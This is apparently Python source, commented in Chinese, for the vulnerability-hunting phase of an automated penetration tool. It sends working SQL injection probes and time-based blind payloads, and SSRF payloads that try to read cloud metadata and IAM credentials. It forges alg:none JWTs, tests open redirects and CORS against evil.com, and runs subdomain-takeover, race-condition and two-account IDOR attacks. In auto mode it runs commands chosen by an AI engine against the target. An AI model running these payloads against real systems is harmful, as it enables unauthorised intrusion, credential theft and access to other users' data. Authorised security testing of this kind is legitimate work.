"""Hunt Phase — 漏洞挖掘阶段（增强版）

增强内容：
- SQLi 检测（error-based + time-based blind via sqlmap）
- SSRF 检测（云 metadata + 内网探测）
- JWT 审计（alg:none, 弱密钥, kid注入）
- 子域名接管验证（CNAME 悬挂检测）
- 开放重定向检测（为 OAuth chain 做准备）
- 保留原有: Nuclei + XSS + CORS + 竞态 + IDOR + 密钥泄露
"""

import sys
import os
import re
import hashlib

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from shell_utils import shell_quote, sanitize_url
from .base import BasePhase


class HuntPhase(BasePhase):
    """漏洞挖掘：SQLi、SSRF、JWT、XSS、CORS、竞态、IDOR、子域名接管、开放重定向"""
    
    def execute(self, target: str, findings: dict) -> dict:
        phase_findings = {"vulnerabilities": [], "secrets": []}
        
        self.logger.log_phase_start("漏洞挖掘 (Hunt — Enhanced)")
        
        # ═══ Step 1: Nuclei 扫描（限速+高中危）═══
        alive = findings.get('alive_hosts', [])
        if alive:
            hosts = [h.split()[0] if ' ' in h else h for h in alive[:30]]
            pipe_cmd = self._pipe_lines(hosts)
            self._step("Nuclei高中危扫描", target, phase_findings, findings,
                       f"{pipe_cmd} | nuclei -severity critical,high,medium -rate-limit 5 -c 3 -silent 2>/dev/null | head -80",
                       self._parse_nuclei,
                       "vulnerabilities")
        
        # ═══ Step 2: SQLi 检测 ═══
        self._sqli_test(target, findings, phase_findings)
        
        # ═══ Step 3: SSRF 检测 ═══
        self._ssrf_test(target, findings, phase_findings)
        
        # ═══ Step 4: XSS 检测 (dalfox) ═══
        params = findings.get('params', [])
        xss_urls = [p for p in params if '?' in p and '[' not in p][:15]
        if xss_urls:
            pipe_cmd = self._pipe_lines(xss_urls)
            self._step("Dalfox XSS检测", target, phase_findings, findings,
                       f"{pipe_cmd} | dalfox pipe --worker 2 --delay 300 --silence 2>/dev/null | head -30",
                       self._parse_dalfox,
                       "vulnerabilities")
        
        # ═══ Step 5: CORS 错配检测（增强：测试 credentials）═══
        if alive:
            hosts = [h.split()[0] if ' ' in h else h for h in alive[:10]]
            pipe_cmd = self._pipe_lines(hosts)
            self._step("CORS错配检测(含credentials)", target, phase_findings, findings,
                       f"{pipe_cmd} | while read h; do "
                       f"resp=$(curl -s -H 'Origin: https://evil.com' -I \"$h\" 2>/dev/null); "
                       f"echo \"$resp\" | grep -qi 'access-control-allow-origin.*evil\\|access-control-allow-origin.*\\*' && "
                       f"echo \"$resp\" | grep -qi 'access-control-allow-credentials.*true' && "
                       f"echo \"CORS_CRED: $h\" || "
                       f"(echo \"$resp\" | grep -qi 'access-control-allow-origin.*evil\\|access-control-allow-origin.*\\*' && echo \"CORS: $h\"); "
                       f"done | head -20",
                       self._parse_cors,
                       "vulnerabilities")
        
        # ═══ Step 6: JWT 审计 ═══
        self._jwt_audit(target, findings, phase_findings)
        
        # ═══ Step 7: 开放重定向检测（为 chain 做准备）═══
        self._open_redirect_test(target, findings, phase_findings)
        
        # ═══ Step 8: 子域名接管验证 ═══
        self._subdomain_takeover_test(target, findings, phase_findings)
        
        # ═══ Step 9: 密钥泄露扫描 ═══
        safe_org = target.split('.')[0] if '.' in target else target
        self._step("TruffleHog密钥扫描", target, phase_findings, findings,
                   f"trufflehog github --org={shell_quote(safe_org)} --only-verified --json 2>/dev/null | head -10",
                   self._parse_secrets,
                   "secrets")
        
        # ═══ Step 10: 并发竞态检测 ═══
        self._race_condition_test(target, findings, phase_findings)
        
        # ═══ Step 11: IDOR 越权检测 ═══
        self._idor_test(target, findings, phase_findings)
        
        # ═══ Step 12: AI 决策额外攻击面 ═══
        if self.mode == "auto":
            combined = {**findings, **phase_findings}
            decision = self.engine.decide_next_action("hunt", combined, target)
            if decision.get("action") == "execute":
                cmd = decision.get("command", "")
                if cmd and self._safe_command(cmd, target):
                    self._step(f"AI: {decision.get('reason', '额外探测')}", target, 
                               phase_findings, findings, cmd, lambda out: [], None)
        
        return phase_findings
    
    # ═══════════════════════════════════════════════════════════════
    #  新增：SQLi 检测
    # ═══════════════════════════════════════════════════════════════
    
    def _sqli_test(self, target: str, findings: dict, phase_findings: dict):
        """SQL 注入检测：error-based 快速探测 + sqlmap 验证"""
        params = findings.get('params', [])
        urls_with_params = [p for p in params if '?' in p and '[' not in p][:30]
        
        if not urls_with_params:
            return
        
        # Step A: 快速 error-based 探测（单引号触发错误）
        sqli_candidates = []
        pipe_cmd = self._pipe_lines(urls_with_params[:20])
        self._step("SQLi快速探测(单引号)", target, phase_findings, findings,
                   f"{pipe_cmd} | while read url; do "
                   f"test_url=$(echo \"$url\" | sed \"s/=\\([^&]*\\)/=\\1'/g\"); "
                   f"resp=$(curl -s --max-time 8 \"$test_url\" 2>/dev/null); "
                   f"echo \"$resp\" | grep -qiE 'sql syntax|mysql|ORA-|postgresql|sqlite|unclosed quotation|syntax error' && "
                   f"echo \"SQLI_CANDIDATE: $url\"; "
                   f"done",
                   self._parse_sqli_candidates,
                   "vulnerabilities")
        
        # Step B: 对候选 URL 用手动时间盲注验证（不用sqlmap，避免封IP）
        sqli_urls = [v.get('url', '') for v in phase_findings["vulnerabilities"] 
                    if v.get('type') == 'SQLi (候选)'][:5]
        
        if sqli_urls:
            console.print(f"    对 {len(sqli_urls)} 个候选做时间盲注验证（手动，不用sqlmap）...")
            time_payloads = [
                ("' AND SLEEP(5)-- -", 5),
                ("' OR SLEEP(5)-- -", 5),
                ("1' WAITFOR DELAY '0:0:5'-- -", 5),  # MSSQL
                ("' AND pg_sleep(5)-- -", 5),  # PostgreSQL
            ]
            for url in sqli_urls:
                safe_url = sanitize_url(url)
                for payload, delay in time_payloads[:2]:
                    test_url = re.sub(r'(=)[^&]*', f'\\1{payload}', safe_url, count=1)
                    self._step(f"SQLi时间盲注: {url[:40]}", target, phase_findings, findings,
                               f"start=$(date +%s); "
                               f"curl -s --max-time 12 {shell_quote(test_url)} > /dev/null 2>&1; "
                               f"end=$(date +%s); "
                               f"elapsed=$((end - start)); "
                               f'[ $elapsed -ge {delay} ] && echo "SQLI_TIME_CONFIRMED: {url} (${{elapsed}}s)" || '
                               f'echo "NO (${{elapsed}}s)"',
                               self._parse_sqli_result,
                               "vulnerabilities")
        
        # Step C: gf sqli 模式补充（从URL模式匹配）
        all_urls = findings.get('urls', [])[:200]
        if all_urls:
            pipe_cmd = self._pipe_lines(all_urls)
            self._step("gf SQLi模式匹配", target, phase_findings, findings,
                       f"{pipe_cmd} | gf sqli 2>/dev/null | sort -u | head -20",
                       lambda out: [f"[SQLI_PATTERN] {u}" for u in out.strip().split('\n') if u.strip()],
                       "vulnerabilities")
    
    # ═══════════════════════════════════════════════════════════════
    #  新增：SSRF 检测
    # ═══════════════════════════════════════════════════════════════
    
    def _ssrf_test(self, target: str, findings: dict, phase_findings: dict):
        """SSRF 检测：URL参数注入内网地址/云 metadata"""
        params = findings.get('params', [])
        
        # 找含 URL/路径参数的接口
        ssrf_candidates = []
        url_param_patterns = re.compile(
            r'[?&](url|uri|path|link|src|source|dest|destination|redirect|return|'
            r'next|target|rurl|ref|callback|webhook|proxy|fetch|load|img|image|'
            r'file|document|page|site|html)=', re.I
        )
        
        for url in params:
            if url_param_patterns.search(url):
                ssrf_candidates.append(url)
        
        # 从 gf ssrf 结果中补充
        gf_ssrf = [p for p in params if '[' not in p and 
                  any(kw in p.lower() for kw in ['url=', 'uri=', 'path=', 'src=', 'dest=', 'redirect='])]
        ssrf_candidates.extend(gf_ssrf)
        ssrf_candidates = list(set(ssrf_candidates))[:15]
        
        if not ssrf_candidates:
            return
        
        self.logger.log_event("FINDING", f"发现 {len(ssrf_candidates)} 个SSRF候选参数")
        
        # 测试 metadata endpoint
        metadata_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",  # 阿里云
        ]
        
        for url in ssrf_candidates[:5]:
            safe_url = sanitize_url(url)
            # 替换参数值为 metadata URL
            for payload in metadata_payloads[:2]:
                # 替换最后一个参数值
                test_url = re.sub(r'(=)[^&]*$', f'\\1{payload}', safe_url)
                if test_url == safe_url:
                    test_url = re.sub(r'(=)[^&]*(&)', f'\\1{payload}\\2', safe_url, count=1)
                
                self._step(f"SSRF metadata: {url[:40]}", target, phase_findings, findings,
                           f"curl -s --max-time 10 {shell_quote(test_url)} 2>/dev/null | "
                           f"grep -iE 'ami-|instance-id|iam|AccessKeyId|security-credentials|"
                           f"compute|project-id|zone|hostname' | head -5",
                           self._parse_ssrf,
                           "vulnerabilities")
        
        # 测试内网回连（127.0.0.1 各种绕过）
        bypass_payloads = [
            "http://127.0.0.1:80/",
            "http://0x7f000001/",
            "http://2130706433/",
            "http://127.1/",
            "http://[::1]/",
        ]
        
        for url in ssrf_candidates[:3]:
            safe_url = sanitize_url(url)
            for payload in bypass_payloads[:2]:
                test_url = re.sub(r'(=)[^&]*$', f'\\1{payload}', safe_url)
                self._step(f"SSRF内网: {url[:40]}", target, phase_findings, findings,
                           f"resp=$(curl -s -w '\\nHTTP_CODE:%{{http_code}}\\nSIZE:%{{size_download}}' "
                           f"--max-time 8 {shell_quote(test_url)} 2>/dev/null); "
                           f"echo \"$resp\" | tail -3",
                           self._parse_ssrf_blind,
                           "vulnerabilities")
    
    # ═══════════════════════════════════════════════════════════════
    #  新增：JWT 审计
    # ═══════════════════════════════════════════════════════════════
    
    def _jwt_audit(self, target: str, findings: dict, phase_findings: dict):
        """JWT 审计：alg:none, 弱密钥, kid注入"""
        # 从已有数据中提取 JWT token
        all_data = ' '.join(findings.get('urls', [])[:50]) + ' '
        all_data += ' '.join(findings.get('params', [])[:50])
        
        # JWT 正则匹配
        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
        jwt_tokens = jwt_pattern.findall(all_data)
        
        if not jwt_tokens:
            # 尝试从存活主机的响应头中提取
            alive = findings.get('alive_hosts', [])
            if alive:
                hosts = [h.split()[0] if ' ' in h else h for h in alive[:3]]
                pipe_cmd = self._pipe_lines(hosts)
                self._step("JWT Token提取", target, phase_findings, findings,
                           f"{pipe_cmd} | while read h; do "
                           f"curl -s -I --max-time 8 \"$h\" 2>/dev/null | "
                           f"grep -oE 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'; "
                           f"done | head -5",
                           lambda out: [t for t in out.strip().split('\n') if t.startswith('eyJ')],
                           "vulnerabilities")
            return
        
        self.logger.log_event("FINDING", f"发现 {len(jwt_tokens)} 个 JWT token")
        
        # 对每个 JWT 做基础审计
        for token in list(set(jwt_tokens))[:3]:
            # 解码 header 检查 alg
            self._step(f"JWT解码审计", target, phase_findings, findings,
                       f"echo {shell_quote(token.split('.')[0])} | base64 -d 2>/dev/null; echo",
                       self._parse_jwt_header,
                       "vulnerabilities")
            
            # 尝试 alg:none 攻击
            self._step("JWT alg:none测试", target, phase_findings, findings,
                       f"header=$(echo -n '{{\"alg\":\"none\",\"typ\":\"JWT\"}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
                       f"payload=$(echo {shell_quote(token)} | cut -d. -f2); "
                       f"echo \"$header.$payload.\"",
                       lambda out: [f"[JWT_NONE] {out.strip()}"] if out.strip() else [],
                       "vulnerabilities")
    
    # ═══════════════════════════════════════════════════════════════
    #  新增：开放重定向检测
    # ═══════════════════════════════════════════════════════════════
    
    def _open_redirect_test(self, target: str, findings: dict, phase_findings: dict):
        """开放重定向检测：为后续 OAuth chain 做准备"""
        params = findings.get('params', [])
        
        # 找含重定向参数的 URL
        redirect_params = re.compile(
            r'[?&](redirect|return|next|url|rurl|dest|destination|continue|'
            r'forward|goto|target|redir|return_to|redirect_uri|callback|returnUrl)=', re.I
        )
        
        redirect_candidates = [u for u in params if redirect_params.search(u) and '[' not in u][:10]
        
        if not redirect_candidates:
            return
        
        self.logger.log_event("FINDING", f"发现 {len(redirect_candidates)} 个重定向参数候选")
        
        # 用多种绕过方式测试
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%00.{target}",
            "https://{target}@evil.com",
            "////evil.com",
        ]
        
        for url in redirect_candidates[:5]:
            safe_url = sanitize_url(url)
            for payload in redirect_payloads[:3]:
                test_payload = payload.replace('{target}', target)
                test_url = re.sub(r'(redirect|return|next|url|dest|callback|returnUrl|redirect_uri)=[^&]*',
                                 f'\\1={test_payload}', safe_url, count=1, flags=re.I)
                
                self._step(f"开放重定向: {url[:40]}", target, phase_findings, findings,
                           f"resp=$(curl -s -o /dev/null -w '%{{http_code}} %{{redirect_url}}' "
                           f"-L --max-redirs 0 --max-time 8 {shell_quote(test_url)} 2>/dev/null); "
                           f"echo \"$resp\" | grep -iE '30[12].*evil|Location.*evil' && "
                           f"echo \"REDIRECT_VULN: {test_url}\"",
                           self._parse_redirect,
                           "vulnerabilities")
    
    # ═══════════════════════════════════════════════════════════════
    #  新增：子域名接管验证
    # ═══════════════════════════════════════════════════════════════
    
    def _subdomain_takeover_test(self, target: str, findings: dict, phase_findings: dict):
        """子域名接管验证：检查 CNAME 悬挂"""
        # 从 recon 阶段获取接管候选
        takeover_candidates = [u for u in findings.get('urls', []) if '[TAKEOVER]' in u]
        
        if not takeover_candidates:
            # 也检查所有子域名的 CNAME
            subdomains = findings.get('subdomains', [])[:50]
            if subdomains:
                pipe_cmd = self._pipe_lines(subdomains)
                self._step("CNAME悬挂检测", target, phase_findings, findings,
                           f"{pipe_cmd} | while read sub; do "
                           f"cname=$(dig +short CNAME \"$sub\" 2>/dev/null | head -1); "
                           f"if [ -n \"$cname\" ]; then "
                           f"  host \"$cname\" 2>/dev/null | grep -q 'NXDOMAIN\\|not found' && "
                           f"  echo \"TAKEOVER: $sub -> $cname\"; "
                           f"fi; done",
                           self._parse_takeover_verified,
                           "vulnerabilities")
        else:
            for candidate in takeover_candidates[:10]:
                sub = candidate.replace('[TAKEOVER]', '').strip()
                self._step(f"接管验证: {sub}", target, phase_findings, findings,
                           f"cname=$(dig +short CNAME {shell_quote(sub)} 2>/dev/null | head -1); "
                           f"echo \"CNAME: $cname\"; "
                           f"host \"$cname\" 2>/dev/null | grep -q 'NXDOMAIN\\|not found' && "
                           f"echo \"CONFIRMED_TAKEOVER: {sub} -> $cname\"",
                           self._parse_takeover_verified,
                           "vulnerabilities")
    
    # ═══════════════════════════════════════════════════════════════
    #  解析方法（新增）
    # ═══════════════════════════════════════════════════════════════
    
    def _parse_sqli_candidates(self, output: str) -> list:
        """解析 SQLi 快速探测结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'SQLI_CANDIDATE:' in line:
                url = line.replace('SQLI_CANDIDATE:', '').strip()
                vulns.append({
                    "type": "SQLi (候选)",
                    "url": url,
                    "severity": "high",
                    "detail": "单引号触发SQL错误响应，需时间盲注确认"
                })
                self.logger.log_event("FINDING", f"⚠️ SQLi候选: {url[:80]}")
        return vulns
    
    def _parse_ssrf(self, output: str) -> list:
        """解析 SSRF metadata 响应"""
        vulns = []
        if output.strip() and any(kw in output.lower() for kw in 
                                   ['ami-', 'instance-id', 'iam', 'accesskeyid', 
                                    'security-credentials', 'compute', 'project-id']):
            vulns.append({
                "type": "SSRF (Cloud Metadata)",
                "url": "见日志",
                "severity": "critical",
                "detail": f"成功读取云 metadata: {output.strip()[:200]}"
            })
            self.logger.log_event("FINDING", f"🔥 SSRF 读到 metadata! {output[:100]}")
        return vulns
    
    def _parse_ssrf_blind(self, output: str) -> list:
        """解析 SSRF blind（通过响应大小/状态码差异判断）"""
        vulns = []
        # 如果返回了内容（SIZE > 0）且状态码是 200，可能有 SSRF
        if 'HTTP_CODE:200' in output and 'SIZE:0' not in output:
            size_match = re.search(r'SIZE:(\d+)', output)
            if size_match and int(size_match.group(1)) > 50:
                vulns.append({
                    "type": "SSRF (Blind/Internal)",
                    "url": "见日志",
                    "severity": "high",
                    "detail": f"内网请求返回了内容(size={size_match.group(1)})，需进一步确认"
                })
        return vulns
    
    def _parse_jwt_header(self, output: str) -> list:
        """解析 JWT header"""
        vulns = []
        output_lower = output.lower()
        if '"alg"' in output_lower:
            if '"none"' in output_lower:
                vulns.append({
                    "type": "JWT alg:none",
                    "url": "见token",
                    "severity": "critical",
                    "detail": "JWT使用alg:none，可伪造任意token"
                })
            elif '"hs256"' in output_lower:
                vulns.append({
                    "type": "JWT HS256 (可能弱密钥)",
                    "url": "见token",
                    "severity": "medium",
                    "detail": "JWT使用HS256，尝试弱密钥爆破"
                })
            # kid 注入检测
            if '"kid"' in output_lower:
                vulns.append({
                    "type": "JWT kid参数 (可能可注入)",
                    "url": "见token",
                    "severity": "medium",
                    "detail": "JWT含kid字段，可能存在SQL注入或路径遍历"
                })
        return vulns
    
    def _parse_redirect(self, output: str) -> list:
        """解析开放重定向测试结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'REDIRECT_VULN:' in line:
                url = line.replace('REDIRECT_VULN:', '').strip()
                vulns.append({
                    "type": "Open Redirect",
                    "url": url[:200],
                    "severity": "medium",
                    "detail": "开放重定向确认，可用于OAuth token窃取链",
                    "chainable": True
                })
                self.logger.log_event("FINDING", f"⚠️ 开放重定向: {url[:80]}")
        return vulns
    
    def _parse_takeover_verified(self, output: str) -> list:
        """解析子域名接管验证结果"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'CONFIRMED_TAKEOVER:' in line or 'TAKEOVER:' in line:
                detail = line.replace('CONFIRMED_TAKEOVER:', '').replace('TAKEOVER:', '').strip()
                vulns.append({
                    "type": "Subdomain Takeover",
                    "url": detail,
                    "severity": "high",
                    "detail": f"CNAME悬挂确认: {detail}"
                })
                self.logger.log_event("FINDING", f"🔥 子域名接管: {detail}")
        return vulns
    
    # ═══════════════════════════════════════════════════════════════
    #  原有方法（保留）
    # ═══════════════════════════════════════════════════════════════
    
    def _race_condition_test(self, target: str, findings: dict, phase_findings: dict):
        """并发竞态自动检测"""
        urls = findings.get('urls', []) + findings.get('params', [])
        if not urls:
            return
        
        # AI 筛选可能的竞态接口（只针对写操作类接口）
        sample_urls = '\n'.join(urls[:50])
        analysis = self.engine.think(f"""
从以下URL列表中，找出可能存在并发竞态漏洞的**写操作**接口。
必须是有实际副作用的操作（支付/提现/领券/签到/投票/点赞/下单），
不要选纯 GET 查询接口。

{sample_urls}

只输出你认为最可能有竞态问题的URL（最多3个），每行一个。
如果没有找到明确的写操作接口，输出 "NONE"
""")
        
        if not analysis or "NONE" in analysis.upper():
            return
        
        race_targets = [l.strip() for l in analysis.strip().split('\n') if l.strip() and 'http' in l.lower()][:3]
        
        if not race_targets:
            return
        
        self.logger.log_event("FINDING", f"识别到 {len(race_targets)} 个可能的竞态接口")
        
        cookie = self.engine.config.get('session_monitor', {}).get('cookie', '')
        
        for race_url in race_targets:
            safe_url = sanitize_url(race_url)
            # 用简单的 curl 并发测试
            cookie_header = f'-H "Cookie: {cookie}" ' if cookie else ''
            cmd = (f'for i in $(seq 1 5); do '
                   f'curl -s -o /tmp/race_$i.txt -w "%{{http_code}}\\n" '
                   f'{cookie_header}'
                   f'{shell_quote(safe_url)} & done; wait; '
                   f'cat /tmp/race_*.txt | md5sum; '
                   f'rm -f /tmp/race_*.txt')
            
            self._step(f"竞态测试: {race_url[:50]}", target, phase_findings, findings,
                       cmd, self._parse_race, "vulnerabilities")
    
    def _idor_test(self, target: str, findings: dict, phase_findings: dict):
        """IDOR 越权检测（多账号对比 + 响应体对比）"""
        config = self.engine.config
        idor_config = config.get('idor', {})
        
        cookie_a = idor_config.get('cookie_a', '')
        cookie_b = idor_config.get('cookie_b', '')
        
        if not cookie_a or not cookie_b:
            return
        
        urls = findings.get('urls', []) + findings.get('params', [])
        if not urls:
            return
        
        sample_urls = '\n'.join(urls[:50])
        analysis = self.engine.think(f"""
从以下URL中，找出可能存在IDOR(越权访问)的接口。
必须是包含明确的用户特定标识符的接口（用户ID/订单号/消息ID等数字参数）。
排除公开接口（商品详情、文章页、首页等任何人都能访问的）。

例如: /api/user/123/profile, /order/456/detail, /message?id=789

{sample_urls}

只输出最可能有IDOR的URL（最多3个），每行一个。
如果没有找到包含用户特定ID的URL，输出 "NONE"
""")
        
        if not analysis or "NONE" in analysis.upper():
            return
        
        idor_targets = [l.strip() for l in analysis.strip().split('\n') if l.strip() and 'http' in l.lower()][:3]
        
        if not idor_targets:
            return
        
        self.logger.log_event("FINDING", f"识别到 {len(idor_targets)} 个可能的IDOR接口")
        
        for idor_url in idor_targets:
            safe_url = sanitize_url(idor_url)
            # 用 A 和 B 的 Cookie 分别访问，同时保存响应体做 hash 对比
            cmd = (
                f'echo "=== Account A ===" && '
                f'curl -s -w "\\nHTTP_CODE:%{{http_code}}" '
                f'-H "Cookie: {cookie_a}" {shell_quote(safe_url)} > /tmp/idor_a.txt && '
                f'cat /tmp/idor_a.txt | tail -5 && '
                f'echo "\\nHASH_A:" && md5sum /tmp/idor_a.txt && '
                f'echo "\\n=== Account B ===" && '
                f'curl -s -w "\\nHTTP_CODE:%{{http_code}}" '
                f'-H "Cookie: {cookie_b}" {shell_quote(safe_url)} > /tmp/idor_b.txt && '
                f'cat /tmp/idor_b.txt | tail -5 && '
                f'echo "\\nHASH_B:" && md5sum /tmp/idor_b.txt && '
                f'rm -f /tmp/idor_a.txt /tmp/idor_b.txt'
            )
            
            self._step(f"IDOR测试: {idor_url[:50]}", target, phase_findings, findings,
                       cmd, self._parse_idor, "vulnerabilities")
    
    def _parse_nuclei(self, output: str) -> list:
        """解析 nuclei 输出"""
        vulns = []
        for line in output.strip().split('\n'):
            if line.strip():
                vulns.append({
                    "type": "nuclei",
                    "url": line.strip(),
                    "severity": "high",
                    "detail": line.strip()
                })
        return vulns
    
    def _parse_dalfox(self, output: str) -> list:
        """解析 dalfox 输出"""
        vulns = []
        for line in output.strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            # dalfox 输出 POC 时包含 [POC] 或 [V] 标记
            if 'POC' in line.upper() or '[V]' in line.upper() or 'XSS' in line.upper():
                vulns.append({
                    "type": "XSS",
                    "url": line,
                    "severity": "high",
                    "detail": line
                })
        return vulns
    
    def _parse_cors(self, output: str) -> list:
        """解析 CORS 输出"""
        vulns = []
        for line in output.strip().split('\n'):
            if 'CORS:' in line:
                vulns.append({
                    "type": "CORS Misconfiguration",
                    "url": line.replace("CORS:", "").strip(),
                    "severity": "medium",
                    "detail": "Access-Control-Allow-Origin 接受任意来源"
                })
        return vulns
    
    def _parse_secrets(self, output: str) -> list:
        """解析 trufflehog 输出"""
        secrets = []
        for line in output.strip().split('\n'):
            if line.strip():
                secrets.append(line.strip()[:200])
        return secrets

    def _parse_race(self, output: str) -> list:
        """
        解析并发竞态测试输出（改进版）。
        不再仅凭多个200就判定为竞态，还要检查响应体是否有差异。
        """
        vulns = []
        codes = [l.strip() for l in output.strip().split('\n') if l.strip().isdigit()]
        
        if not codes:
            return vulns
        
        success_count = codes.count("200")
        
        # 必须全部都是200才有可能是竞态（如果有非200说明服务端在做控制）
        if success_count == len(codes) and success_count >= 3:
            # 进一步检查：如果响应体 hash 都相同，更可能是幂等操作（非竞态）
            # 如果 hash 不同，说明每次请求产生了不同结果，更可能是竞态
            has_different_hashes = False
            hashes = []
            for line in output.strip().split('\n'):
                if 'md5sum' in line.lower() or len(line.strip()) == 32:
                    hashes.append(line.strip())
            
            if len(set(hashes)) > 1:
                has_different_hashes = True
            
            detail = f"并发{len(codes)}次请求，{success_count}次成功(200)"
            if has_different_hashes:
                detail += "，响应体不同（可能产生了重复效果）"
                vulns.append({
                    "type": "Race Condition (并发竞态)",
                    "url": "见日志",
                    "severity": "high",
                    "detail": detail
                })
            else:
                # 响应相同，可能只是幂等接口，标记为需人工确认
                detail += "，但响应体相同（可能是幂等操作，需人工确认数据库/余额是否重复变化）"
                vulns.append({
                    "type": "Race Condition (疑似，需人工确认)",
                    "url": "见日志",
                    "severity": "medium",
                    "detail": detail
                })
        
        return vulns

    def _parse_idor(self, output: str) -> list:
        """
        解析 IDOR 测试输出（改进版）。
        对比两个账号的响应：
        - 两个都是200 + 响应体hash相同 → 可能是公开接口，不是IDOR
        - 两个都是200 + 响应体hash不同 → 更可能是真IDOR（B看到了A的数据）
        - A是200，B是403/401 → 有权限控制，不是IDOR
        """
        vulns = []
        
        if "Account A" not in output or "Account B" not in output:
            return vulns
        
        # 提取状态码
        code_a = None
        code_b = None
        hash_a = None
        hash_b = None
        
        lines = output.strip().split('\n')
        in_a = False
        in_b = False
        
        for line in lines:
            if "Account A" in line:
                in_a = True
                in_b = False
            elif "Account B" in line:
                in_b = True
                in_a = False
            
            if "HTTP_CODE:" in line:
                code = line.split("HTTP_CODE:")[-1].strip()
                if in_a:
                    code_a = code
                elif in_b:
                    code_b = code
            
            if "HASH_A:" in line:
                in_a = True
            elif "HASH_B:" in line:
                in_b = True
            
            # md5sum 输出格式: "hash  filename"
            if len(line.strip()) >= 32 and line.strip()[:32].replace(' ', '').isalnum():
                h = line.strip().split()[0] if line.strip().split() else ""
                if in_a and not hash_a:
                    hash_a = h
                elif in_b and not hash_b:
                    hash_b = h
        
        # 判断逻辑
        if code_a == "200" and code_b == "200":
            if hash_a and hash_b and hash_a == hash_b:
                # 响应完全相同 → 很可能是公开接口
                # 不报为漏洞，但记录日志
                self.logger.log_event("SKIP", 
                    "IDOR测试: 两账号响应体相同，可能是公开接口，跳过")
            elif hash_a and hash_b and hash_a != hash_b:
                # 响应不同 + 都能访问 → 可能是真IDOR
                vulns.append({
                    "type": "IDOR (水平越权)",
                    "url": "见日志",
                    "severity": "high",
                    "detail": "账号B能访问账号A的资源，且响应内容不同（非公开数据）"
                })
            else:
                # 没拿到 hash，回退到基本判断但标记需要确认
                vulns.append({
                    "type": "IDOR (疑似，需人工确认)",
                    "url": "见日志",
                    "severity": "medium",
                    "detail": "两账号都返回200，但无法对比响应体，需人工确认是否为公开接口"
                })
        elif code_a == "200" and code_b in ("401", "403"):
            # 有权限控制，不是IDOR
            self.logger.log_event("SKIP",
                f"IDOR测试: 账号B收到{code_b}，接口有权限控制")
        
        return vulns
